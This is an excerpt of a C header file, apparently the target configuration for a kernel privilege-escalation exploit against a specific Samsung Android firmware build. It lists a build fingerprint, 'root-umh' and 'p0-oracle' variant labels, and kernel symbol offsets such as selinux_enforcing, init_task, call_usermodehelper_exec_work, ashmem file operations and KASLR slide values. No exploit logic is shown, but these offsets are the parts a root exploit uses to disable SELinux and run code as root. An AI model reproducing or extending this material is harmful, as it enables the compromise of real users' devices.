...
#define BUILD_VARIANT_LABEL "b7s-F766BXXSCBZH3-app-physical-p0-oracle"
#define APP_PHYS_P0_ORACLE 1
#else
#define BUILD_VARIANT_LABEL "b7s-F766BXXSCBZH3-root-umh"
#endif

#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT \
  "samsung/b7sxxx/essi:16/BP4A.251205.006/F766BXXSCBZH3:user/release-keys"
#endif
...
#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x000d97e4ULL
...
#define P0_FINGERPRINT_HEADER \
  "targets/b7s-F766BXXSCBZH3/p0_fingerprint.h"
...
/* ogkiF766BXXSCBZH3 offsets. */
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x000d0ea4ULL
#define NOOP_LLSEEK_OFF 0x003c9590ULL
#define COPY_SPLICE_READ_OFF 0x002d3144ULL
#define CONFIGFS_READ_ITER_OFF 0x00495364ULL
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x00495890ULL
#define ASHMEM_IOCTL_OFF 0x00d726b8ULL
#define ASHMEM_COMPAT_IOCTL_OFF 0x00d72d74ULL
#define ASHMEM_MMAP_OFF 0x00d72dc8ULL
#define ASHMEM_OPEN_OFF 0x00d72fe8ULL
#define ASHMEM_RELEASE_OFF 0x00d73070ULL
#define ASHMEM_SHOW_FDINFO_OFF 0x00d730fcULL
#define ANON_PIPE_BUF_OPS_OFF 0x0124d448ULL
#define ASHMEM_FOPS_OFF 0x0140bce8ULL
#define KMALLOC_CACHES_OFF 0x017dc170ULL
#define SYSTEM_UNBOUND_WQ_OFF 0x022fae60ULL
#define INIT_TASK_OFF 0x0230e340ULL
#define ROOT_TASK_GROUP_OFF 0x0251bd80ULL
#define SELINUX_ENFORCING_OFF 0x0255e5a8ULL
#define SYSCTL_BOOTID_OFF 0x026416c0ULL
#define ASHMEM_MISC_OFF 0x0247cb18ULL
...
#define SLIDE_NFULNL_LOGGER_NAME_OFF 0x0175fa57ULL
#define SLIDE_NFULNL_LOGGER_OBJECT_OFF 0x02302278ULL
#define SLIDE_RB_PARENT_TYPE_RESTORE 1ULL
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF 0x02439510ULL
